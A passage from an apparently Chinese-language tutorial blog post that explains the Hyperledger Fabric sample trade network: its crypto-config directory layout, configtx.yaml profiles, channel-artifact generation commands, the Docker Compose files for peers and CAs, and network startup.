第一个Orderer的信息msp及tls</span></span><br><span class="line">│       ├── msp</span><br><span class="line">│       │   ├── admincerts  <span class="comment">## 组织管理员身份验证证书 </span></span><br><span class="line">│       │   │   └── Admin@trade.com-cert.pem</span><br><span class="line">│       │   ├── cacerts</span><br><span class="line">│       │   │   └── ca.trade.com-cert.pem</span><br><span class="line">│       │   ├── keystore  <span class="comment">## 本节点的身份私钥，用来签名</span></span><br><span class="line">│       │   │   └── 38195f71e2b520910f2a2e405764975e235c7d97ff6a7fde41127e1575888375_sk</span><br><span class="line">│       │   ├── signcerts  <span class="comment">## 验证本节点签名的证书，【被根证书签名】</span></span><br><span class="line">│       │   │   └── orderer.trade.com-cert.pem</span><br><span class="line">│       │   └── tlscacerts  <span class="comment">## TLS连接用的身份证书，【和msp.tlscacerts一致】</span></span><br><span class="line">│       │       └── tlsca.trade.com-cert.pem</span><br><span class="line">│       └── tls  <span class="comment">## tls 的相关信息</span></span><br><span class="line">│           ├── ca.crt   <span class="comment">##【组织的根证书】</span></span><br><span class="line">│           ├── server.crt  <span class="comment">## 验证本节点签名的证书，【被根证书签名】</span></span><br><span class="line">│           └── server.key  <span class="comment">## 本节点的身份私钥，用来签名</span></span><br><span class="line">├── tlsca  <span class="comment">## 存放tls相关的证书和私钥</span></span><br><span class="line">│   ├── acbada48c339b2b60cb9bac3914f359722f37de001628f110792153d8614c443_sk</span><br><span class="line">│   └── tlsca.trade.com-cert.pem</span><br><span class="line">└── users  <span class="comment">##  存放属于该组织的用户的实体</span></span><br><span class="line">    └── Admin@trade.com</span><br><span class="line">        ├── msp</span><br><span class="line">        │   ├── admincerts</span><br><span class="line">        │   │   └── Admin@trade.com-cert.pem</span><br><span class="line">        │   ├── cacerts</span><br><span class="line">        │   │   └── ca.trade.com-cert.pem</span><br><span class="line">        │   ├── keystore</span><br><span class="line">        │   │   └── 2187f9edda98eae3b2169a476e30aff6fb2781c19e6cb400671b723d7b74abde_sk</span><br><span class="line">        │   ├── signcerts</span><br><span class="line">        │   │   └── Admin@trade.com-cert.pem</span><br><span class="line">        │   └── tlscacerts</span><br><span class="line">        │       └── tlsca.trade.com-cert.pem</span><br><span class="line">        └── tls</span><br><span class="line">            ├── ca.crt</span><br><span class="line">            ├── client.crt</span><br><span class="line">            └── client.key</span><br></pre></td></tr></table></figure><p>我们可以知道cryptogen工具无非就是在各个资源下生成组织和私钥、证书等等，其中最关键的就是各个资源下的MSP目录内容：</p><pre><code>admincerts：    管理员的身份证书文件cacerts：       信任的根证书文件keystore：      节点的签名私钥文件signcerts：     节点的签名身份证书文件tlscacerts：    TLS连接用的证书</code></pre><h4 id="3、通道及锚节点的配置-configtx-yaml-配置剖析"><a href="#3、通道及锚节点的配置-configtx-yaml-配置剖析" class="headerlink" title="3、通道及锚节点的配置  configtx.yaml 配置剖析"></a>3、通道及锚节点的配置  configtx.yaml 配置剖析</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Organizations:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="meta">&amp;TradeOrdererOrg</span></span><br><span class="line"><span class="attr">        Name:</span> <span class="string">TradeOrdererOrg</span> <span class="comment">#Orderer的组织的名称</span></span><br><span class="line"><span class="attr">        ID:</span> <span class="string">TradeOrdererMSP</span>   <span class="comment">#Orderer的组织的ID</span></span><br><span class="line">        <span class="comment"># MSPDir是包含Orderer的MSP证书目录路径</span></span><br><span class="line"><span class="attr">        MSPDir:</span> <span class="string">crypto-config/ordererOrganizations/trade.com/msp</span>  </span><br><span class="line">        </span><br><span class="line"><span class="bullet">    -</span> <span class="meta">&amp;ExporterOrg</span></span><br><span class="line"><span class="attr">        Name:</span> <span class="string">ExporterOrgMSP</span> </span><br><span class="line"><span class="attr">        ID:</span> <span class="string">ExporterOrgMSP</span></span><br><span class="line"><span class="attr">        MSPDir:</span> <span class="string">crypto-config/peerOrganizations/exporterorg.trade.com/msp</span></span><br><span class="line"><span class="attr">        AnchorPeers:</span></span><br><span class="line">            <span class="comment">#锚点定义可以使用的对等节点的位置</span></span><br><span class="line">            <span class="comment">#这些节点用于跨组织的信息交流。注意，这个值只是</span></span><br><span class="line">            <span class="comment">#用来加密应用程序部分上下文的创世区块</span></span><br><span class="line"><span class="attr">            - Host:</span> <span class="string">peer0.exporterorg.trade.com</span>  <span class="comment">##  锚节点的主机名</span></span><br><span class="line"><span class="attr">              Port:</span> <span class="number">7051</span>  <span class="comment">##  锚节点的端口号</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="meta">&amp;ImporterOrg</span></span><br><span class="line"><span class="attr">        Name:</span> <span class="string">ImporterOrgMSP</span></span><br><span class="line"><span class="attr">        ID:</span> <span class="string">ImporterOrgMSP</span></span><br><span class="line"><span class="attr">        MSPDir:</span> <span class="string">crypto-config/peerOrganizations/importerorg.trade.com/msp</span></span><br><span class="line"><span class="attr">        AnchorPeers:</span></span><br><span class="line"><span class="attr">            - Host:</span> <span class="string">peer0.importerorg.trade.com</span></span><br><span class="line"><span class="attr">              Port:</span> <span class="number">7051</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="meta">&amp;CarrierOrg</span></span><br><span class="line"><span class="attr">        Name:</span> <span class="string">CarrierOrgMSP</span></span><br><span class="line"><span class="attr">        ID:</span> <span class="string">CarrierOrgMSP</span></span><br><span class="line"><span class="attr">        MSPDir:</span> <span class="string">crypto-config/peerOrganizations/carrierorg.trade.com/msp</span></span><br><span class="line"><span class="attr">        AnchorPeers:</span></span><br><span class="line"><span class="attr">            - Host:</span> <span class="string">peer0.carrierorg.trade.com</span></span><br><span class="line"><span class="attr">              Port:</span> <span class="number">7051</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">    -</span> <span class="meta">&amp;RegulatorOrg</span></span><br><span class="line"><span class="attr">        Name:</span> <span class="string">RegulatorOrgMSP</span></span><br><span class="line"><span class="attr">        ID:</span> <span class="string">RegulatorOrgMSP</span></span><br><span class="line"><span class="attr">        MSPDir:</span> <span class="string">crypto-config/peerOrganizations/regulatororg.trade.com/msp</span></span><br><span class="line"><span class="attr">        AnchorPeers:</span></span><br><span class="line"><span class="attr">            - Host:</span> <span class="string">peer0.regulatororg.trade.com</span></span><br><span class="line"><span class="attr">              Port:</span> <span class="number">7051</span></span><br><span class="line"></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="comment">#   SECTION: Orderer</span></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="attr">Orderer:</span> <span class="meta">&amp;OrdererDefaults</span></span><br><span class="line"><span class="attr">    OrdererType:</span> <span class="string">solo</span>   <span class="comment">## Orderer类型，包含solo和kafka集群</span></span><br><span class="line"><span class="attr">    Addresses:</span>   <span class="comment">## 服务地址</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">orderer.trade.com:7050</span></span><br><span class="line"><span class="attr">    BatchTimeout:</span> <span class="number">2</span><span class="string">s</span> <span class="comment">##  区块打包的最大超时时间 (到了该时间就打包区块)</span></span><br><span class="line"><span class="attr">    BatchSize:</span></span><br><span class="line">        <span class="comment">#一个区块里最大的交易数</span></span><br><span class="line"><span class="attr">        MaxMessageCount:</span> <span class="number">10</span></span><br><span class="line">        <span class="comment"># 一个区块的最大字节数， 任何时候都不能超过</span></span><br><span class="line"><span class="attr">        AbsoluteMaxBytes:</span> <span class="number">99</span> <span class="string">MB</span></span><br><span class="line">        <span class="comment">#一个区块的建议字节数，如果一个交易消息的大小超过了这个值, 就会被放入另外一个更大的区块中</span></span><br><span class="line"><span class="attr">        PreferredMaxBytes:</span> <span class="number">512</span> <span class="string">KB</span></span><br><span class="line"><span class="attr">    Kafka:</span></span><br><span class="line"><span class="attr">        Brokers:</span>  <span class="comment">## kafka的 brokens 服务地址 允许有多个</span></span><br><span class="line"><span class="bullet">            -</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="string">:9092</span></span><br><span class="line"><span class="attr">    Organizations:</span> <span class="comment">##  参与维护 Orderer 的组织，默认为空</span></span><br><span class="line"></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="comment">#   SECTION: Application</span></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="attr">Application:</span> <span class="meta">&amp;ApplicationDefaults</span> <span class="comment">## 自定义被引用的地址</span></span><br><span class="line"><span class="attr">    Organizations:</span></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="comment">#   SECTION: Capabilities</span></span><br><span class="line"><span class="comment">################################################################################</span></span><br><span class="line"><span class="attr">Capabilities:</span></span><br><span class="line"><span class="attr">    Global:</span> <span class="meta">&amp;ChannelCapabilities</span></span><br><span class="line"><span class="attr">        V1_1:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    Orderer:</span> <span class="meta">&amp;OrdererCapabilities</span></span><br><span class="line"><span class="attr">        V1_1:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    Application:</span> <span class="meta">&amp;ApplicationCapabilities</span></span><br><span class="line"><span class="attr">        V1_1:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Profiles:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">    FourOrgsTradeOrdererGenesis:</span></span><br><span class="line"><span class="attr">        Capabilities:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*ChannelCapabilities</span></span><br><span class="line"><span class="attr">        Orderer:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*OrdererDefaults</span></span><br><span class="line"><span class="attr">            Organizations:</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*TradeOrdererOrg</span></span><br><span class="line"><span class="attr">            Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*OrdererCapabilities</span></span><br><span class="line"><span class="attr">        Consortiums:</span></span><br><span class="line"><span class="attr">            TradeConsortium:</span></span><br><span class="line"><span class="attr">                Organizations:</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*ExporterOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*ImporterOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*CarrierOrg</span></span><br><span class="line"><span class="bullet">                    -</span> <span class="meta">*RegulatorOrg</span></span><br><span class="line"><span class="attr">    FourOrgsTradeChannel:</span></span><br><span class="line"><span class="attr">        Consortium:</span> <span class="string">TradeConsortium</span></span><br><span class="line"><span class="attr">        Application:</span></span><br><span class="line">            <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationDefaults</span></span><br><span class="line"><span class="attr">            Organizations:</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*ExporterOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*ImporterOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*CarrierOrg</span></span><br><span class="line"><span class="bullet">                -</span> <span class="meta">*RegulatorOrg</span></span><br><span class="line"><span class="attr">            Capabilities:</span></span><br><span class="line">                <span class="string">&lt;&lt;:</span> <span class="meta">*ApplicationCapabilities</span></span><br></pre></td></tr></table></figure><h4 id="4、通道工件配置channel-artifacts剖析"><a href="#4、通道工件配置channel-artifacts剖析" class="headerlink" title="4、通道工件配置channel-artifacts剖析"></a>4、通道工件配置channel-artifacts剖析</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeOrdererGenesis -outputBlock ./channel-artifacts/genesis.block   <span class="comment">##生成创世区块</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeChannel -outputCreateChannelTx ./channel-artifacts/channel.tx -channelID tradechannel <span class="comment">## 生成通道配置信息</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeChannel -outputAnchorPeersUpdate ./channel-artifacts/ExporterOrgMSPanchors.tx -channelID tradechannel -asOrg ExporterOrgMSP</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeChannel -outputAnchorPeersUpdate ./channel-artifacts/ImporterOrgMSPanchors.tx -channelID tradechannel -asOrg ImporterOrgMSP</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeChannel -outputAnchorPeersUpdate ./channel-artifacts/CarrierOrgMSPanchors.tx -channelID tradechannel -asOrg CarrierOrgMSP</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ configtxgen -profile FourOrgsTradeChannel -outputAnchorPeersUpdate ./channel-artifacts/RegulatorOrgMSPanchor.tx -channelID tradechannel -asOrg RegulatorORGMSP</span><br></pre></td></tr></table></figure><p>以上命令均包含在./trade.sh中，该脚本还应包含将环境变量FABRIC_CFG_PATH设置为指向包含configtx.yaml文件的文件夹才能使configtxgen工具正常工作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> PATH=<span class="variable">$&#123;PWD&#125;</span>/../bin:<span class="variable">$&#123;PWD&#125;</span>:<span class="variable">$PATH</span>   <span class="comment">##配置cryptogen环境变量（前面已配置，此例子无效）</span></span><br><span class="line">$ <span class="built_in">export</span> FABRIC_CFG_PATH=<span class="variable">$&#123;PWD&#125;</span>   <span class="comment">## $&#123;PWD&#125;获取当前目录路径的字符串值</span></span><br></pre></td></tr></table></figure><p>查看channel-artifacts文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ tree channel-artifacts</span><br><span class="line">channel-artifacts/</span><br><span class="line">├── CarrierOrgMSPanchors.tx    <span class="comment">##Carrier组织MSP锚节点配置</span></span><br><span class="line">├── channel.tx                 <span class="comment">##通道配置</span></span><br><span class="line">├── ExporterOrgMSPanchors.tx   <span class="comment">##Exportor组织MSP锚节点配置</span></span><br><span class="line">├── genesis.block              <span class="comment">##创世区块</span></span><br><span class="line">├── ImporterOrgMSPanchors.tx   <span class="comment">##Importer组织MSP锚节点通道配置</span></span><br><span class="line">└── RegulatorOrgMSPanchors.tx  <span class="comment">##Regulator组织MSP锚节点通道配置</span></span><br></pre></td></tr></table></figure><h3 id="四、示例贸易网络分析"><a href="#四、示例贸易网络分析" class="headerlink" title="四、示例贸易网络分析"></a>四、示例贸易网络分析</h3><h4 id="1、相关docker镜像及配置"><a href="#1、相关docker镜像及配置" class="headerlink" title="1、相关docker镜像及配置"></a>1、相关docker镜像及配置</h4><p>hyperledger将该网络运行在三个docker镜像中，在前面的hyperledger fabric环境搭建中已经下拉了这些镜像，可以通过docker命令查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker images |grep hyperledger/fabric-[opc][^co].*[^-]latest</span><br><span class="line">hyperledger/fabric-orderer     latest     <span class="comment">## 用于orderer</span></span><br><span class="line">hyperledger/fabric-peer        latest     <span class="comment">## 用于peer</span></span><br><span class="line">hyperledger/fabric-ca          latest     <span class="comment">## 用于MSP</span></span><br></pre></td></tr></table></figure><p>与docker相关配置文件有三个peer-base.yaml、docker-compose-base.yaml和docker-compose-e2e.yaml，前者是后者的扩展（extends）。</p><h4 id="2、peer-base-yaml配置剖析"><a href="#2、peer-base-yaml配置剖析" class="headerlink" title="2、peer-base.yaml配置剖析"></a>2、peer-base.yaml配置剖析</h4><p>peer-base.yaml在./base 文件夹中，该配置定义了四个peer共同的相关配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span>   <span class="comment">#服务定义 开始标签</span></span><br><span class="line"><span class="attr">  peer-base:</span>   <span class="comment">#服务名</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">hyperledger/fabric-peer:$IMAGE_TAG</span>   <span class="comment">#docker镜像名</span></span><br><span class="line"><span class="attr">    environment:</span>   <span class="comment">#环境变量</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_VM_ENDPOINT=unix:///host/var/run/docker.sock</span></span><br><span class="line">      <span class="comment"># the following setting starts chaincode containers on the same</span></span><br><span class="line">      <span class="comment"># bridge network as the peers</span></span><br><span class="line">      <span class="comment"># https://docs.docker.com/compose/networking/</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE=$&#123;COMPOSE_PROJECT_NAME&#125;_trade</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_LOGGING_LEVEL=INFO</span>    <span class="comment">#记录信息、警告和错误消息</span></span><br><span class="line">      <span class="comment">#- CORE_LOGGING_LEVEL=DEBUG</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_TLS_ENABLED=true</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_GOSSIP_USELEADERELECTION=true</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_GOSSIP_ORGLEADER=false</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_PROFILE_ENABLED=true</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_TLS_CERT_FILE=/etc/hyperledger/fabric/tls/server.crt</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_TLS_KEY_FILE=/etc/hyperledger/fabric/tls/server.key</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_TLS_ROOTCERT_FILE=/etc/hyperledger/fabric/tls/ca.crt</span></span><br><span class="line"><span class="attr">    working_dir:</span> <span class="string">/opt/gopath/src/github.com/hyperledger/fabric/peer</span> <span class="comment">#工作路径</span></span><br><span class="line"><span class="attr">    command:</span> <span class="string">peer</span> <span class="string">node</span> <span class="string">start</span>  <span class="comment">#启动命令</span></span><br></pre></td></tr></table></figure><h4 id="3、docker-compose-base-yaml配置剖析"><a href="#3、docker-compose-base-yaml配置剖析" class="headerlink" title="3、docker-compose-base.yaml配置剖析"></a>3、docker-compose-base.yaml配置剖析</h4><p>docker-compose-base.yaml在./base文件夹中，该配置是每个对等节点具体的配置，以peer0.exporterorg.trade.com为例（其中orderer的配置与peer-base.yaml相似，可参考上面的配置）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">peer0.exporterorg.trade.com:</span>   <span class="comment">#服务名</span></span><br><span class="line"><span class="attr">    container_name:</span> <span class="string">peer0.exporterorg.trade.com</span>     <span class="comment">#容器名</span></span><br><span class="line"><span class="attr">    extends:</span>  <span class="comment">#扩展配置</span></span><br><span class="line"><span class="attr">      file:</span> <span class="string">peer-base.yaml</span>   <span class="comment">#扩展配置文件</span></span><br><span class="line"><span class="attr">      service:</span> <span class="string">peer-base</span>     <span class="comment">#扩展配置服务</span></span><br><span class="line"><span class="attr">    environment:</span>   <span class="comment">#环境变量</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_ID=peer0.exporterorg.trade.com</span>   <span class="comment">#ID与configtx.yaml中相匹配</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_ADDRESS=peer0.exporterorg.trade.com:7051</span>  <span class="comment">#地址</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_GOSSIP_BOOTSTRAP=peer0.exporterorg.trade.com:7051</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_GOSSIP_EXTERNALENDPOINT=peer0.exporterorg.trade.com:7051</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">CORE_PEER_LOCALMSPID=ExporterOrgMSP</span>   <span class="comment">#MSP与configtx.yaml中相匹配</span></span><br><span class="line"><span class="attr">    volumes:</span>   <span class="comment">#挂载卷</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">/var/run/:/host/var/run/</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">../crypto-config/peerOrganizations/exporterorg.trade.com/peers/peer0.exporterorg.trade.com/msp:/etc/hyperledger/fabric/msp</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">../crypto-config/peerOrganizations/exporterorg.trade.com/peers/peer0.exporterorg.trade.com/tls:/etc/hyperledger/fabric/tls</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">peer0.exporterorg.trade.com:/var/hyperledger/production</span></span><br><span class="line"><span class="attr">    ports:</span>  <span class="comment">#端口映射  host主机端口:容器内端口</span></span><br><span class="line"><span class="bullet">      -</span> <span class="number">7051</span><span class="string">:7051</span>   <span class="comment">#服务器侦听端口</span></span><br><span class="line"><span class="bullet">      -</span> <span class="number">7053</span><span class="string">:7053</span>   <span class="comment">#客户端订阅端口</span></span><br><span class="line"><span class="bullet">      -</span> <span class="number">7055</span><span class="string">:6060</span></span><br></pre></td></tr></table></figure><h4 id="4、docker-compose-e2e-yaml配置剖析"><a href="#4、docker-compose-e2e-yaml配置剖析" class="headerlink" title="4、docker-compose-e2e.yaml配置剖析"></a>4、docker-compose-e2e.yaml配置剖析</h4><p>docker-compose-e2e.yaml，由命令./trade.sh generate -c tradechannel创建，依赖于base / docker-compose-base.yaml（以及间接base / peer-base.yaml），从名为docker-compose-e2e-template.yaml的模板YAML文件创建（同一文件夹）。以exporter-ca为例查看相关MSP配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span>   <span class="comment">#服务定义 开始标签</span></span><br><span class="line"><span class="attr">  exporter-ca:</span>  <span class="comment">#服务名</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">hyperledger/fabric-ca:$IMAGE_TAG</span>   <span class="comment">#docker镜像</span></span><br><span class="line"><span class="attr">    environment:</span>   <span class="comment">#环境变量</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">FABRIC_CA_HOME=/etc/hyperledger/fabric-ca-server</span>  <span class="comment">#在MSP中运行的服务名</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">FABRIC_CA_SERVER_CA_NAME=ca-exporterorg</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">FABRIC_CA_SERVER_TLS_ENABLED=true</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">FABRIC_CA_SERVER_TLS_CERTFILE=/etc/hyperledger/fabric-ca-server-config/ca.exporterorg.trade.com-cert.pem</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">FABRIC_CA_SERVER_TLS_KEYFILE=/etc/hyperledger/fabric-ca-server-config/6842d1c3a357472cc249fe42d3e97ffe7ba0210ab89781a3fdd73cbc30f8934b_sk</span></span><br><span class="line"><span class="attr">    ports:</span>   <span class="comment">#端口映射  host主机端口:容器内端口</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"7054:7054"</span></span><br><span class="line"><span class="attr">    command:</span> <span class="string">sh</span> <span class="bullet">-c</span> <span class="string">'fabric-ca-server start --ca.certfile /etc/hyperledger/fabric-ca-server-config/ca.exporterorg.trade.com-cert.pem --ca.keyfile /etc/hyperledger/fabric-ca-server-config/6842d1c3a357472cc249fe42d3e97ffe7ba0210ab89781a3fdd73cbc30f8934b_sk -b admin:adminpw -d'</span>    <span class="comment">#启动命令  默认登录名和密码（分别为admin和adminpw）</span></span><br><span class="line"><span class="attr">    volumes:</span>   <span class="comment">#挂载卷</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">./crypto-config/peerOrganizations/exporterorg.trade.com/ca/:/etc/hyperledger/fabric-ca-server-config</span></span><br><span class="line"><span class="attr">    container_name:</span> <span class="string">ca_peerExporterOrg</span>    <span class="comment">#容器名</span></span><br><span class="line"><span class="attr">    networks:</span>  <span class="comment">#所处网络</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">trade</span></span><br></pre></td></tr></table></figure><h3 id="五、启动样本交易网络"><a href="#五、启动样本交易网络" class="headerlink" title="五、启动样本交易网络"></a>五、启动样本交易网络</h3><h4 id="1、启动网络"><a href="#1、启动网络" class="headerlink" title="1、启动网络"></a>1、启动网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$./trade.sh up -c tradechannel</span><br></pre></td></tr></table></figure><h4 id="2、查看docker进程"><a href="#2、查看docker进程" class="headerlink" title="2、查看docker进程"></a>2、查看docker进程</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps <span class="comment">#查看docker进程</span></span><br><span class="line">CONTAINER ID        IMAGE                               COMMAND                  CREATED             STATUS              PORTS                                                                       NAMES</span><br><span class="line">a716239d97ad        hyperledger/fabric-peer:latest      <span class="string">"peer node start"</span>        26 seconds ago      Up 11 seconds       0.0.0.0:9055-&gt;6060/tcp, 0.0.0.0:9051-&gt;7051/tcp, 0.0.0.0:9053-&gt;7053/tcp      peer0.carrierorg.trade.com</span><br><span class="line">c3ce947f9490        hyperledger/fabric-peer:latest      <span class="string">"peer node start"</span>        26 seconds ago      Up 12 seconds       0.0.0.0:8055-&gt;6060/tcp, 0.0.0.0:8051-&gt;7051/tcp, 